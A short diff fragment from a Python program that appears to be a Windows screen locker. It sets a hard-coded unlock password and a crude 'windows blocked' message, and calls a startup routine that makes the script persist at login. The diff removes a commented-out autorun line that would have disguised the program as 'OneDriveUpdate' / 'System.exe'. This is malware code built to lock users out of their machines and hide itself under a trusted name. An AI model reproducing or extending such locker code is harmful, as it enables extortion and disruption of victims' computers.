@@ -18,11 +18,11 @@ import sys
 password = "123"
 lock_text = "windows blocked.tobi pizda"
 count = 3
-#name = "lock.py"
+
 
 
 file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
-#AddToAutorun("OneDriveUpdate", "C:\\ProgramData\\", "System.exe")
+
 startup(file_path)
 
 def buton(arg):
